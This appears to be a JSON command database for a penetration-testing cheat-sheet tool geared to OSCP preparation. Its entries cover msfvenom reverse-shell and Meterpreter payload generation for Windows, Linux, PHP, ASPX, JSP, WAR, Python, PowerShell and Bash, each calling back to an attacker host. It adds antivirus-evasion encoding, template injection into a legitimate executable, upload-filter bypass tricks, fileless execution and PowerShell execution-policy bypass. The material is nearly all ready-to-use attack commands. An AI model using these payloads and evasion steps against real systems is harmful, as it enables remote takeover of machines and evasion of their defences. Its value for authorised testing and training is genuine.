{
  "category": "exploitation",
  "commands": [
    {
      "id": "msfvenom-list-payloads",
      "name": "List Available Payloads",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -l payloads --platform <PLATFORM> --arch <ARCH>",
      "description": "Display all payloads available for specific platform and architecture",
      "tags": ["METASPLOIT", "MSFVENOM", "PAYLOADS", "ENUMERATION"],
      "variables": [
        {
          "name": "<PLATFORM>",
          "description": "Target platform (windows, linux, osx, android, etc)",
          "example": "windows",
          "required": false
        },
        {
          "name": "<ARCH>",
          "description": "Target architecture (x86, x64, arm, mips, etc)",
          "example": "x64",
          "required": false
        }
      ],
      "flag_explanations": {
        "-l payloads": "List all available payloads",
        "--platform": "Filter by target OS platform",
        "--arch": "Filter by CPU architecture",
        "-l formats": "List available output formats (exe, elf, php, etc)",
        "-l encoders": "List available encoders for evasion"
      },
      "success_indicators": [
        "Long list of payload paths displayed",
        "Payloads filtered by platform/arch if specified"
      ],
      "failure_indicators": [
        "msfvenom command not found"
      ],
      "next_steps": ["msfvenom-windows-reverse", "msfvenom-linux-reverse"],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "command_not_found": "Install Metasploit: sudo apt install metasploit-framework"
      },
      "notes": "Staged payloads contain '/' (e.g., windows/meterpreter/reverse_tcp). Non-staged contain '_' (e.g., windows/meterpreter_reverse_tcp). Use filters to reduce overwhelming output.",
      "oscp_relevance": "medium"
    },
    {
      "id": "msfvenom-windows-reverse",
      "name": "Generate Windows Reverse Shell Executable",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe",
      "description": "Create Windows 64-bit executable with non-staged TCP reverse shell",
      "tags": ["METASPLOIT", "MSFVENOM", "WINDOWS", "REVERSE_SHELL", "PAYLOAD_GEN"],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address for reverse connection",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker listening port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "-p": "Specify payload",
        "LHOST": "Listener host (attacker IP)",
        "LPORT": "Listener port (attacker port)",
        "-f": "Output format (exe, elf, php, asp, war, etc)",
        "-o": "Output file path",
        "-e": "Encoder for evasion (optional)",
        "-i": "Encoding iterations (optional)",
        "--platform": "Force platform (optional)",
        "--arch": "Force architecture (optional)"
      },
      "success_indicators": [
        "No encoder specified, outputting raw payload",
        "Payload size displayed (bytes)",
        "Final size of exe file shown",
        "Saved as: shell.exe"
      ],
      "failure_indicators": [
        "Failed to generate payload",
        "Invalid option format",
        "Permission denied (output path)"
      ],
      "next_steps": ["msf-handler-setup", "nc-listener", "file-transfer-http"],
      "alternatives": ["msfvenom -p windows/x64/meterpreter_reverse_tcp (Meterpreter instead)", "manual-shellcode-generation"],
      "prerequisites": [],
      "troubleshooting": {
        "antivirus_detected": "Use encoding: -e x86/shikata_ga_nai -i 3",
        "payload_too_large": "Use staged variant: windows/x64/shell/reverse_tcp (smaller first stage)",
        "wrong_arch": "For 32-bit: windows/shell_reverse_tcp (no x64)"
      },
      "notes": "Non-staged payload (shell_reverse_tcp) is self-contained. Staged variant (shell/reverse_tcp) requires multi/handler. Use Netcat for non-staged, multi/handler for staged.",
      "oscp_relevance": "high"
    },
    {
      "id": "msfvenom-windows-meterpreter",
      "name": "Generate Windows Meterpreter Executable",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<LHOST> LPORT=<LPORT> -f exe -o met.exe",
      "description": "Create Windows 64-bit executable with non-staged Meterpreter over HTTPS",
      "tags": ["METASPLOIT", "MSFVENOM", "WINDOWS", "METERPRETER", "HTTPS"],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP for HTTPS reverse connection",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker HTTPS listener port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "meterpreter_reverse_https": "Non-staged Meterpreter with encrypted HTTPS transport",
        "meterpreter/reverse_https": "Staged variant (smaller but requires multi/handler)",
        "meterpreter_reverse_tcp": "Non-staged over raw TCP (alternative)",
        "-f exe": "Windows executable format"
      },
      "success_indicators": [
        "Payload size shown (larger than basic shell - ~200KB)",
        "Saved as: met.exe"
      ],
      "failure_indicators": [
        "Payload generation failed"
      ],
      "next_steps": ["msf-handler-meterpreter-https"],
      "alternatives": ["windows/x64/meterpreter_reverse_tcp (TCP instead of HTTPS)"],
      "prerequisites": [],
      "troubleshooting": {
        "handler_mismatch": "Must use matching payload in multi/handler: windows/x64/meterpreter_reverse_https",
        "large_file_size": "Meterpreter non-staged is ~200KB (staged is smaller but requires handler)"
      },
      "notes": "HTTPS transport encrypts C2 traffic and blends with normal web traffic. Requires multi/handler with matching payload. Non-staged (_) vs staged (/) distinction critical for handler setup.",
      "oscp_relevance": "high"
    },
    {
      "id": "msfvenom-linux-reverse",
      "name": "Generate Linux ELF Reverse Shell",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf",
      "description": "Create Linux 64-bit ELF executable with non-staged TCP reverse shell",
      "tags": ["METASPLOIT", "MSFVENOM", "LINUX", "REVERSE_SHELL", "ELF"],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "linux/x64/shell_reverse_tcp": "64-bit non-staged shell",
        "linux/x86/shell_reverse_tcp": "32-bit variant",
        "-f elf": "Linux ELF executable format"
      },
      "success_indicators": [
        "Payload size displayed",
        "Saved as: shell.elf",
        "File is executable (add chmod +x if needed)"
      ],
      "failure_indicators": [
        "Invalid architecture"
      ],
      "next_steps": ["nc-listener", "file-transfer-http", "chmod-executable"],
      "alternatives": ["msfvenom -p linux/x64/meterpreter_reverse_tcp (Meterpreter variant)"],
      "prerequisites": [],
      "troubleshooting": {
        "wrong_arch": "Check target arch with: uname -m (x86_64 = x64, i686 = x86)",
        "not_executable": "After transfer, make executable: chmod +x shell.elf",
        "permission_denied": "Execute as: ./shell.elf (or from /tmp with noexec bypass)"
      },
      "notes": "After uploading to target, must chmod +x before execution. ELF binaries often caught by AV - consider alternatives like scripting languages (Python, Bash).",
      "oscp_relevance": "high"
    },
    {
      "id": "msfvenom-php-reverse",
      "name": "Generate PHP Web Shell",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p php/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php",
      "description": "Create PHP Meterpreter reverse shell for web application exploitation",
      "tags": ["METASPLOIT", "MSFVENOM", "PHP", "WEB_SHELL", "METERPRETER"],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "php/meterpreter_reverse_tcp": "PHP Meterpreter payload",
        "php/reverse_php": "Alternative simple PHP reverse shell",
        "-f raw": "Raw output format (pure PHP code)"
      },
      "success_indicators": [
        "PHP code output to file",
        "File contains <?php opening tag"
      ],
      "failure_indicators": [
        "Invalid format"
      ],
      "next_steps": ["msf-handler-php", "upload-web-shell"],
      "alternatives": ["php/reverse_php (simpler, no Meterpreter)", "manual-php-reverse-shell"],
      "prerequisites": [],
      "troubleshooting": {
        "upload_blocked": "Rename extension (shell.php.jpg, shell.pHP, etc)",
        "shell_not_executing": "Ensure uploaded to executable directory (not /uploads with execute disabled)",
        "handler_timeout": "Verify PHP script executed via web browser/curl"
      },
      "notes": "Upload via file upload vulnerability or writable web directory. Execute by browsing to uploaded file. PHP Meterpreter has limited features compared to Windows/Linux variants.",
      "oscp_relevance": "high"
    },
    {
      "id": "msfvenom-aspx-reverse",
      "name": "Generate ASPX Web Shell",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o shell.aspx",
      "description": "Create ASPX web shell for IIS server exploitation",
      "tags": ["METASPLOIT", "MSFVENOM", "ASPX", "IIS", "WEB_SHELL"],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "-f aspx": "ASP.NET format for IIS servers",
        "-f asp": "Classic ASP format (older IIS versions)"
      },
      "success_indicators": [
        "ASPX code generated",
        "Saved as: shell.aspx"
      ],
      "failure_indicators": [
        "Format not supported"
      ],
      "next_steps": ["msf-handler-setup", "upload-web-shell"],
      "alternatives": ["windows/meterpreter/reverse_tcp -f asp (for classic ASP)"],
      "prerequisites": [],
      "troubleshooting": {
        "upload_blocked": "Try .aspx, .asmx, or .ashx extensions",
        "execution_failed": "Verify IIS server allows ASPX execution in upload directory",
        "permissions_denied": "ASPX executes as IIS user (often low privileges)"
      },
      "notes": "ASPX shells run on Windows IIS servers. Upload via file upload vuln or writable webdav. Default IIS execution context is low-privileged service account.",
      "oscp_relevance": "medium"
    },
    {
      "id": "msfvenom-jsp-reverse",
      "name": "Generate JSP Web Shell",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.jsp",
      "description": "Create JSP web shell for Java application servers (Tomcat, JBoss, WebLogic)",
      "tags": ["METASPLOIT", "MSFVENOM", "JSP", "JAVA", "TOMCAT"],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "java/jsp_shell_reverse_tcp": "JSP reverse shell payload",
        "-f raw": "Raw JSP code output",
        "-f war": "WAR file format (alternative for Tomcat deployment)"
      },
      "success_indicators": [
        "JSP code generated",
        "Contains <%@ page import statements"
      ],
      "failure_indicators": [
        "Invalid payload"
      ],
      "next_steps": ["nc-listener", "upload-tomcat-war"],
      "alternatives": ["msfvenom -p java/jsp_shell_reverse_tcp -f war (WAR file for manager deployment)"],
      "prerequisites": [],
      "troubleshooting": {
        "war_preferred": "For Tomcat Manager, use -f war instead of -f raw",
        "execution_context": "JSP runs as Tomcat service user (often tomcat or tomcat7)"
      },
      "notes": "JSP format for manual upload. WAR format for Tomcat Manager deployment. JSP files must be in webroot or accessible web directory.",
      "oscp_relevance": "medium"
    },
    {
      "id": "msfvenom-war-reverse",
      "name": "Generate WAR Reverse Shell for Tomcat",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war",
      "description": "Create WAR file containing reverse shell for Tomcat Manager deployment",
      "tags": ["METASPLOIT", "MSFVENOM", "TOMCAT", "WAR", "JAVA"],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "-f war": "Java Web Application Archive format",
        "java/jsp_shell_reverse_tcp": "JSP-based reverse shell"
      },
      "success_indicators": [
        "WAR file created",
        "File is ZIP archive containing JSP payload"
      ],
      "failure_indicators": [
        "Invalid format"
      ],
      "next_steps": ["tomcat-manager-deploy", "nc-listener"],
      "alternatives": ["java/meterpreter/reverse_tcp -f war (Meterpreter variant)"],
      "prerequisites": ["tomcat-manager-credentials"],
      "troubleshooting": {
        "deployment_failed": "Check Tomcat Manager credentials",
        "shell_not_executing": "After deploying, browse to /shell/ to trigger payload"
      },
      "notes": "Deploy via Tomcat Manager GUI or curl. After deployment, trigger by browsing to deployed application path. Default WAR name becomes URL path (/shell.war -> /shell/).",
      "oscp_relevance": "high"
    },
    {
      "id": "msfvenom-python-reverse",
      "name": "Generate Python Reverse Shell Script",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p python/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.py",
      "description": "Create Python script with reverse shell payload",
      "tags": ["METASPLOIT", "MSFVENOM", "PYTHON", "SCRIPTING"],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "python/shell_reverse_tcp": "Python-based reverse shell",
        "python/meterpreter_reverse_tcp": "Python Meterpreter variant",
        "-f raw": "Output pure Python code"
      },
      "success_indicators": [
        "Python code generated",
        "Contains import socket, subprocess"
      ],
      "failure_indicators": [
        "Invalid payload"
      ],
      "next_steps": ["nc-listener", "python-execute"],
      "alternatives": ["python/meterpreter_reverse_tcp (Meterpreter features)", "manual-python-reverse-shell"],
      "prerequisites": [],
      "troubleshooting": {
        "python_version": "Ensure Python installed on target: which python || which python3",
        "execution": "Run with: python shell.py or python3 shell.py"
      },
      "notes": "Python scripts work cross-platform (Linux, Windows with Python installed). Less suspicious than compiled binaries. Can be executed without file write via: echo '<CODE>' | python",
      "oscp_relevance": "medium"
    },
    {
      "id": "msfvenom-powershell-reverse",
      "name": "Generate PowerShell Reverse Shell",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f psh -o shell.ps1",
      "description": "Create PowerShell script with Meterpreter reverse shell",
      "tags": ["METASPLOIT", "MSFVENOM", "POWERSHELL", "WINDOWS"],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "-f psh": "PowerShell script format",
        "-f ps1": "Alternative PowerShell format",
        "windows/x64/meterpreter/reverse_tcp": "Staged Meterpreter (requires handler)"
      },
      "success_indicators": [
        "PowerShell code generated",
        "Base64-encoded payload in output"
      ],
      "failure_indicators": [
        "Invalid format"
      ],
      "next_steps": ["msf-handler-setup", "powershell-execute-policy-bypass"],
      "alternatives": ["cmd/windows/reverse_powershell (CMD-compatible)"],
      "prerequisites": [],
      "troubleshooting": {
        "execution_policy": "Bypass with: powershell -ep bypass -File shell.ps1",
        "amsi_detected": "PowerShell payloads often flagged by AMSI - consider obfuscation",
        "handler_required": "Staged payload requires multi/handler with matching settings"
      },
      "notes": "PowerShell payloads fileless and memory-resident. Execute without touching disk: powershell -c <BASE64_PAYLOAD>. Often caught by AV/EDR - use encoding/obfuscation.",
      "oscp_relevance": "high"
    },
    {
      "id": "msfvenom-bash-reverse",
      "name": "Generate Bash Reverse Shell Script",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p cmd/unix/reverse_bash LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.sh",
      "description": "Create Bash script with reverse shell payload",
      "tags": ["METASPLOIT", "MSFVENOM", "BASH", "LINUX", "UNIX"],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "192.168.45.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker port",
          "example": "443",
          "required": true
        }
      ],
      "flag_explanations": {
        "cmd/unix/reverse_bash": "Bash reverse shell command",
        "cmd/unix/reverse": "Generic Unix reverse shell (sh-compatible)",
        "-f raw": "Output raw bash code"
      },
      "success_indicators": [
        "Bash command generated",
        "Contains /dev/tcp/ or nc usage"
      ],
      "failure_indicators": [
        "Invalid payload"
      ],
      "next_steps": ["nc-listener", "bash-execute"],
      "alternatives": ["cmd/unix/reverse (POSIX sh-compatible)", "manual-bash-reverse-shell"],
      "prerequisites": [],
      "troubleshooting": {
        "dev_tcp_unsupported": "Some shells don't support /dev/tcp - use nc alternative",
        "execution": "Make executable: chmod +x shell.sh && ./shell.sh"
      },
      "notes": "Bash payloads work on most Linux/Unix systems. Can be executed inline: bash -c '<PAYLOAD>'. No file write needed for command injection.",
      "oscp_relevance": "medium"
    },
    {
      "id": "msfvenom-encode",
      "name": "Encode Payload for AV Evasion",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p <PAYLOAD> <OPTIONS> -e x86/shikata_ga_nai -i 3 -f <FORMAT> -o encoded.exe",
      "description": "Encode payload multiple times to evade antivirus signature detection",
      "tags": ["METASPLOIT", "MSFVENOM", "ENCODING", "AV_EVASION"],
      "variables": [
        {
          "name": "<PAYLOAD>",
          "description": "Base payload to encode",
          "example": "windows/x64/meterpreter_reverse_tcp",
          "required": true
        },
        {
          "name": "<OPTIONS>",
          "description": "Payload options (LHOST, LPORT, etc)",
          "example": "LHOST=192.168.45.5 LPORT=443",
          "required": true
        },
        {
          "name": "<FORMAT>",
          "description": "Output format",
          "example": "exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "-e": "Encoder module to use",
        "-i": "Number of encoding iterations (more = better evasion, larger payload)",
        "x86/shikata_ga_nai": "Polymorphic XOR additive feedback encoder (popular)",
        "x86/call4_dword_xor": "Alternative encoder",
        "-b": "Bad characters to avoid (e.g., -b '\\x00\\x0a\\x0d')"
      },
      "success_indicators": [
        "Attempting to encode payload with <iterations> iterations",
        "Encoded successfully",
        "Payload size increased (encoding overhead)"
      ],
      "failure_indicators": [
        "Encoding failed",
        "Encoder incompatible with payload"
      ],
      "next_steps": ["test-av-detection"],
      "alternatives": ["custom-obfuscation", "shellcode-encryption"],
      "prerequisites": [],
      "troubleshooting": {
        "still_detected": "Encoding alone insufficient for modern AV - use additional obfuscation",
        "payload_too_large": "More iterations = larger file - balance evasion vs size",
        "encoder_incompatible": "Not all encoders work with all payloads - try different encoder"
      },
      "notes": "Encoding is less effective against modern AV/EDR (behavioral detection). Use as one layer of obfuscation, not sole evasion technique. Iterations above 5-10 provide diminishing returns.",
      "oscp_relevance": "medium"
    },
    {
      "id": "msfvenom-bad-chars",
      "name": "Generate Payload Avoiding Bad Characters",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p <PAYLOAD> <OPTIONS> -b '<BAD_CHARS>' -f <FORMAT>",
      "description": "Generate payload that avoids specified bad characters for buffer overflow exploitation",
      "tags": ["METASPLOIT", "MSFVENOM", "BUFFER_OVERFLOW", "EXPLOIT_DEV"],
      "variables": [
        {
          "name": "<PAYLOAD>",
          "description": "Payload to generate",
          "example": "windows/shell_reverse_tcp",
          "required": true
        },
        {
          "name": "<OPTIONS>",
          "description": "Payload options",
          "example": "LHOST=192.168.45.5 LPORT=443",
          "required": true
        },
        {
          "name": "<BAD_CHARS>",
          "description": "Characters to avoid in payload (hex format)",
          "example": "\\x00\\x0a\\x0d",
          "required": true
        },
        {
          "name": "<FORMAT>",
          "description": "Output format (c, python, raw, etc)",
          "example": "python",
          "required": true
        }
      ],
      "flag_explanations": {
        "-b": "Bad characters to avoid",
        "-f c": "C array format (for C code)",
        "-f python": "Python array format",
        "-f raw": "Raw binary shellcode"
      },
      "success_indicators": [
        "Payload generated avoiding bad chars",
        "Automatic encoder selection to avoid chars"
      ],
      "failure_indicators": [
        "No encoder found to avoid bad characters",
        "Too many bad characters (cannot generate payload)"
      ],
      "next_steps": ["buffer-overflow-exploit"],
      "alternatives": [],
      "prerequisites": ["identify-bad-chars"],
      "troubleshooting": {
        "no_encoder_found": "Too restrictive bad char list - verify bad chars are actually bad",
        "payload_contains_bad_char": "Manually verify payload: hexdump -C shellcode | grep '<BAD_CHAR>'"
      },
      "notes": "Common bad chars: \\x00 (null), \\x0a (newline), \\x0d (carriage return). Use -f python/c for easy integration into exploit code. Verify payload manually before use.",
      "oscp_relevance": "high"
    },
    {
      "id": "msfvenom-custom-template",
      "name": "Inject Payload into Custom Template",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "msfvenom -p <PAYLOAD> <OPTIONS> -x <TEMPLATE_EXE> -f exe -o output.exe",
      "description": "Inject payload into existing executable template to avoid detection",
      "tags": ["METASPLOIT", "MSFVENOM", "TEMPLATE", "AV_EVASION"],
      "variables": [
        {
          "name": "<PAYLOAD>",
          "description": "Payload to inject",
          "example": "windows/meterpreter_reverse_tcp",
          "required": true
        },
        {
          "name": "<OPTIONS>",
          "description": "Payload options",
          "example": "LHOST=192.168.45.5 LPORT=443",
          "required": true
        },
        {
          "name": "<TEMPLATE_EXE>",
          "description": "Path to existing executable to use as template",
          "example": "/usr/share/windows-resources/binaries/plink.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "-x": "Specify custom template executable",
        "-k": "Preserve template behavior (keep original functionality)",
        "-f exe": "Output format (must match template type)"
      },
      "success_indicators": [
        "Injecting payload into template",
        "Output file created",
        "File size similar to original template"
      ],
      "failure_indicators": [
        "Template injection failed",
        "Invalid template file"
      ],
      "next_steps": ["test-payload-functionality"],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "template_broken": "Use -k flag to preserve template functionality",
        "still_detected": "Modern AV detects injection patterns - not reliable evasion alone",
        "wrong_arch": "Template and payload must match architecture (x86 vs x64)"
      },
      "notes": "Template injection helps blend payload into legitimate-looking executable. Use -k to maintain template's original function. Effectiveness limited against modern AV/EDR.",
      "oscp_relevance": "low"
    }
  ]
}
